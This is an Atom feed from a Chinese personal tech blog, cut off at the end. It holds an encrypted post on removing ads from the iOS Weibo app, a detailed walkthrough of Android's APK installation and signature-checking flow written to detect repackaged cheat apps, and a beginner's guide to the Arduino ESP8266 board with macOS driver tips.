<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-08-04T07:06:56.247Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iOS微博客户端动态页面去广告</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/04/weibo-re-remove-ad/weibo-re-remove-ad/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/04/weibo-re-remove-ad/weibo-re-remove-ad/</id>
    <published>2019-08-03T16:47:53.000Z</published>
    <updated>2019-08-04T07:06:56.247Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="iOS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>Android应用安装过程深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/</id>
    <published>2019-08-01T07:08:31.000Z</published>
    <updated>2019-08-01T10:29:23.735Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android应用安装过程深度解析"><a href="#Android应用安装过程深度解析" class="headerlink" title="Android应用安装过程深度解析"></a>Android应用安装过程深度解析</h3><blockquote><p>本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。</p></blockquote><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。</p><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>一个 Android 应用安装到手机上大致分为四种情形：</p><ul><li>系统应用，在设备每次启动时完成安装</li><li>通过 adb install 命令安装</li><li>应用市场安装，封装安装过程（略）</li><li>第三方应用安装或双击安装包，会启动系统应用引导安装</li></ul><p>无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。</p><h4 id="场景一：系统应用安装"><a href="#场景一：系统应用安装" class="headerlink" title="场景一：系统应用安装"></a>场景一：系统应用安装</h4><p>在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801151901799.png?raw=true" alt="image-20190801151901799"></p><p><strong>补充：system_server 的启动与运行流程</strong></p><p>system_server 由 zygote 进程孵化，是整个 Android Framework 的基础</p><p>zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152013042.png?raw=true" alt="image-20190801152013042"></p><p>ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信</p><p>RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法</p><p>SystemServer 的 run() 方法中会完成以下工作：</p><ul><li>设置时间、语言等，设置虚拟机库文件，设置内存</li><li>Looper.prepareMainLooper() 主线程 looper 运行在当前线程</li><li>加载库文件 android_servers，位于 /frameworks/base/services</li><li>createSystemContext() 初始化系统上下文</li><li>SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中</li><li>启动各种系统服务，包括引导服务、核心服务、其他服务</li><li>开启循环，等待其他线程通过 handler 发送消息到主线程来处理</li></ul><p>在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152050671.png?raw=true" alt="image-20190801152050671"></p><p>PackageManagerService 类构造函数中完成了许多工作，主要包含：</p><ul><li>创建 Settings 对象，添加系统的 SharedUser 信息</li><li>为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的</li><li>创建 PackageDexOptimizer 和 DexManager 对象</li><li>获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures</li><li>创建 ServiceThread 和 PackagerHandler 对象</li><li>创建 UserManagerService，支持多用户</li><li>读取系统定义的权限保存到 permConfig 变量中</li><li>读取系统共享库保存到 libConfig 变量中</li><li>解析 package.xml 文件中的内容保存到 ArrayMap<string, packageparser.package=""> 结构中</string,></li><li>配置扫描参数 scanFlags</li><li>开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app</li><li>开始扫描非系统应用，包括目录 /data/app、/data/app-private</li><li>启动内存垃圾回收</li><li>启动私有服务 PackageManagerInternal</li></ul><p>总结来说主要是这几项内容：</p><ul><li>创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接</li><li>扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理）</li><li>创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求</li><li>解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射</li></ul><p>详细说明各项：</p><p>Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152128607.png?raw=true" alt="image-20190801152128607"></p><p>Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152145965.png?raw=true" alt="image-20190801152145965"></p><p>构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量</p><p>重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接</p><p>connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中</p><p>Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装</p><p><strong>!!!!  Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现</strong></p><p><strong>PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理</strong></p><p>PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk</p><p>包括：</p><ul><li>系统应用，目录有 <code>/vender/overlay</code>、<code>/system/framework</code>、<code>/system/priv-app</code>、<code>/system/app</code>、<code>/vendor/app</code>、<code>/oem/app</code></li><li>非系统应用，目录有 <code>/data/app</code>、<code>/data/app-private</code></li></ul><p>调用的方法是 <code>scanDirTracedLI()</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152328199.png?raw=true" alt="image-20190801152328199"></p><p>可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI()</p><p>其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理</p><p>后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等</p><h4 id="场景二：adb-命令安装"><a href="#场景二：adb-命令安装" class="headerlink" title="场景二：adb 命令安装"></a>场景二：adb 命令安装</h4><p>adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建</p><p>源码路径为：<a href="http://androidxref.com/8.1.0_r33/xref/system/core/adb/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/system/core/adb/</a></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152448109.png?raw=true" alt="image-20190801152448109"></p><p>adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。</p><p>Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。</p><p>runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152518924.png?raw=true" alt="image-20190801152518924"></p><p>PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。</p><p>发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。</p><p>PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。</p><h4 id="场景三：第三方应用安装"><a href="#场景三：第三方应用安装" class="headerlink" title="场景三：第三方应用安装"></a>场景三：第三方应用安装</h4><p>当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作</p><p>PackageInstaller 的应用代码位于：<a href="http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/</a></p><p>安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152605993.png?raw=true" alt="image-20190801152605993"></p><p>应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。</p><p>然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。</p><p>用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152635344.png?raw=true" alt="image-20190801152635344"></p><p>InstallInstalling 这个类会拿到应用数据开启真正的安装流程。</p><p>首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。</p><p>接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。</p><p>最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去</p><p>这里就跟 adb 安装走到了同一个流程中。</p><h4 id="深入-PMS-中的安装"><a href="#深入-PMS-中的安装" class="headerlink" title="深入 PMS 中的安装"></a>深入 PMS 中的安装</h4><p>上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152711796.png?raw=true" alt="image-20190801152711796"></p><p>在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。</p><p>所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。</p><p><strong>1、处理 INIT_COPY 消息</strong></p><p>首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。</p><p><strong>2、处理 MCS_BOUND 消息</strong></p><p>首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152741833.png?raw=true" alt="image-20190801152741833"></p><p>HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中，</p><p>InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法</p><p>以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制</p><p>HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152755489.png?raw=true" alt="image-20190801152755489"></p><p> installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法</p><p>其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看  installNewPackageLI() 流程</p><p>installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF()</p><p><strong>3、处理 POST_INSTALL 消息</strong></p><p>首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等</p><h4 id="安装过程小结"><a href="#安装过程小结" class="headerlink" title="安装过程小结"></a>安装过程小结</h4><p>与应用相关的一些目录</p><ul><li><p>/system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力</p></li><li><p>/system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用</p></li><li><p>/data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下</p></li></ul><ul><li><p>/data/data：用户应用数据存放路径，存在沙箱隔离</p></li><li><p>/data/dalvik-cache：存放应用的dex 文件</p></li><li><p>/data/system：存放应用安装相关文件</p><ul><li>packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表</li><li>package.list 指定应用的默认存储位置，userid 等</li></ul></li></ul><p>应用安装过程总结</p><ol><li>将应用 apk 拷贝到指定目录下</li><li>解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/<packagename> 数据目录</packagename></li><li>解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中</li><li>由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上</li></ol><h4 id="PMS-与-PM-与APM"><a href="#PMS-与-PM-与APM" class="headerlink" title="PMS 与 PM 与APM"></a>PMS 与 PM 与APM</h4><p>前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152858658.png?raw=true" alt="image-20190801152858658"></p><p>通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象</p><p>ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理</p><p>继续梳理一下这个类与 PMS 之间的关系</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152915992.png?raw=true" alt="image-20190801152915992"></p><p>IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法</p><p>IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface</p><p>IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager</p><ul><li>asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象</li><li>asBinder() 方法返回自身，即 IPackageManager.Stub 对象</li><li>重写了 onTransact() 方法，根据命令类型处理数据传输</li></ul><p>IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口</p><ul><li>mRemote对象是IBinder类型，是对IPackageManager.Stub的引用</li><li>重写了asBinder()方法，返回mRemote</li><li>实现了AIDL文件定义的接口</li></ul><p>PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能：</p><ul><li>安装/卸载/更新应用，包括 installPackage/</li><li>查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表</li><li>查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象</li><li>查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象</li><li>增加/删除权限，包括 addPermission/removePermission</li><li>清除用户数据/缓存/代码等</li></ul><p>PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集</p><p>ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法</p><p>PackageManagerService 继承了 IPackageManager.Stub</p><p>因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://androidxref.com/8.1.0_r33/xref/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/</a></li><li><a href="https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6" target="_blank" rel="external">https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6</a></li><li><a href="http://solart.cc/2016/10/30/install_apk/" target="_blank" rel="external">http://solart.cc/2016/10/30/install_apk/</a></li><li><a href="https://www.jianshu.com/p/4f16421d5c7f" target="_blank" rel="external">https://www.jianshu.com/p/4f16421d5c7f</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android应用安装过程深度解析&quot;&gt;&lt;a href=&quot;#Android应用安装过程深度解析&quot; class=&quot;headerlink&quot; title=&quot;Android应用安装过程深度解析&quot;&gt;&lt;/a&gt;Android应用安装过程深度解析&lt;/h3&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-08-09T08:47:21.452Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Arduino-ESP8266开发板上手实践"><a href="#Arduino-ESP8266开发板上手实践" class="headerlink" title="Arduino ESP8266开发板上手实践"></a>Arduino ESP8266开发板上手实践</h3><h4 id="环境搭建（macOS）"><a href="#环境搭建（macOS）" class="headerlink" title="环境搭建（macOS）"></a>环境搭建（macOS）</h4><p>官方说明：<a href="https://github.com/esp8266/Arduino">https://github.com/esp8266/Arduino</a></p><ul><li><p><strong>安装IDE （Arduino IDE）</strong></p><p>下载地址：<a href="https://www.arduino.cc/en/main/software" target="_blank" rel="external">https://www.arduino.cc/en/main/software</a></p><p>还有种方式是利用<a href="https://github.com/plerup/makeEspArduino">Makefile</a>去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。</p></li></ul><ul><li><p><strong>下载ESP8266硬件包</strong></p><p>1 、在设置里面的附加板管理器网址中增加以下链接<code>https://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143145367.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、在工具中找到你的开发板，然后进入开发板管理器，搜索<strong>esp8266</strong>安装该库，我这里已经安装了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143643887.png?raw=true" width="500" hegiht="313" align="center"></p><p>注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考<a href="https://github.com/esp8266/Arduino">这里</a></p></li><li><p><strong>运行示例代码</strong></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730144157955.png?raw=true" width="500" hegiht="313" align="center"></p><p>我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。</p><p>代码如下</p><pre><code class="c">/*  ESP8266 Blink by Simon Peter  Blink the blue LED on the ESP-01 module  This example code is in the public domain  The blue LED on the ESP-01 module is connected to GPIO1  (which is also the TXD pin; so we cannot use Serial.print() at the same time)  Note that this sketch uses LED_BUILTIN to find the pin with the internal LED*/void setup() {  pinMode(LED_BUILTIN, OUTPUT);     // Initialize the LED_BUILTIN pin as an output}// the loop function runs over and over again forevervoid loop() {  digitalWrite(LED_BUILTIN, LOW);   // Turn the LED on (Note that LOW is the voltage level  // but actually the LED is on; this is because  // it is active low on the ESP-01)  delay(1000);                      // Wait for a second  digitalWrite(LED_BUILTIN, HIGH);  // Turn the LED off by making the voltage HIGH  delay(2000);                      // Wait for two seconds (to demonstrate the active low LED)}</code></pre><p>在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。</p></li></ul><h4 id="重要！！！一些坑以及注意点"><a href="#重要！！！一些坑以及注意点" class="headerlink" title="重要！！！一些坑以及注意点"></a>重要！！！一些坑以及注意点</h4><p>下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。</p><p>确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。</p><p>1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。<a href="https://developer.apple.com/download/more/" target="_blank" rel="external">下载地址1</a> <a href="https://github.com/vulgo/IORegistryExplorer">下载地址2</a> <a href="https://mac.softpedia.com/get/System-Utilities/IORegistryExplorer.shtml" target="_blank" rel="external">下载地址3</a>在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145128956.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过<code>Virtual COM Port</code>去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的<code>/dev</code>目录下并没有出现对应的文件。之前的驱动大多是这个<a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">CH340G CH34G CH34X Mac OS X driver</a> 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在<a 